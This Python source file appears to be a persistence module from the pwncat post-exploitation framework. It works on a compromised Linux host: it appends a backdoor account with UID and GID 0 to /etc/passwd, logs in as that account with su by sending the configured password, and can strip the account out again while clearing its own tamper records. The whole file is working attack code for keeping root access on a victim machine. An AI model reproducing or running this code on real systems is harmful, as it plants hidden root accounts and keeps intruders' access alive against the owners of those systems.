#!/usr/bin/env python3
import crypt
from typing import Optional
from colorama import Fore

import pwncat
from pwncat.persist import PersistenceMethod, PersistenceError
import pwncat.tamper


class Method(PersistenceMethod):
    """ Install a backdoor user in /etc/passwd with UID and GID == 0. This
    requires root permissions. """

    name: str = "passwd"
    local: bool = True

    @property
    def system(self) -> bool:
        return True

    def install(self, user: Optional[str] = None):

        try:
            # Read the /etc/passwd file
            with pwncat.victim.open("/etc/passwd", "r") as filp:
                passwd = filp.readlines()
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistenceError(str(exc))

        # Grab the properties from the configuration
        user = pwncat.victim.config["backdoor_user"]
        password = pwncat.victim.config["backdoor_pass"]
        hashed = crypt.crypt(password)

        # Add the new passwd entry
        passwd.append(f"{user}:{hashed}:0:0::/root:{pwncat.victim.shell}\n")
        passwd_content = "".join(passwd)

        try:
            # Write the new passwd entries
            with pwncat.victim.open(
                "/etc/passwd", "w", length=len(passwd_content)
            ) as filp:
                filp.write(passwd_content)
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistenceError(str(exc))

        # Ensure user cache is up to date
        pwncat.victim.reload_users()

    def remove(self, user: Optional[str] = None):

        try:
            # Read the /etc/passwd file
            with pwncat.victim.open("/etc/passwd", "r") as filp:
                passwd = filp.readlines()
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistenceError(str(exc))

        # Grab the properties from the configuration
        user = pwncat.victim.config["backdoor_user"]

        # Remove any entries that are for the backdoor user (just in case
        # there's more than one for some reason).
        new_passwd = []
        removed_lines = []
        for entry in passwd:
            if not entry.startswith(f"{user}:"):
                new_passwd.append(entry)
            else:
                removed_lines.append(entry)

        # Build the original_content
        passwd_content = "".join(new_passwd)

        try:
            # Write the new passwd entries
            with pwncat.victim.open(
                "/etc/passwd", "w", length=len(passwd_content)
            ) as filp:
                filp.write(passwd_content)
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistenceError(str(exc))

        pwncat.victim.reload_users()

        # Find tampers referencing this persistence method
        tampers_to_remove = []
        for tamper in pwncat.victim.tamper:
            if (
                isinstance(tamper, pwncat.tamper.ModifiedFile)
                and tamper.added_lines is not None
            ):
                for line in removed_lines:
                    if line in tamper.added_lines:
                        tampers_to_remove.append(tamper)

        # Removing any matching tampers
        for tamper in tampers_to_remove:
            pwncat.victim.tamper.remove(tamper)

    def escalate(self, user: Optional[str] = None) -> bool:

        # First, escalate to the backdoor user
        pwncat.victim.run(f"su {pwncat.victim.config['backdoor_user']}", wait=False)
        pwncat.victim.recvuntil(b": ")
        pwncat.victim.client.send(
            pwncat.victim.config["backdoor_pass"].encode("utf-8") + b"\n"
        )

        if user is not None and user != "root" and pwncat.victim.whoami() == "root":
            # I don't know wh you don't want to be root, but okay...
            pwncat.victim.flush_output()
            pwncat.victim.run(f"exec su {user}", wait=False)

        return True
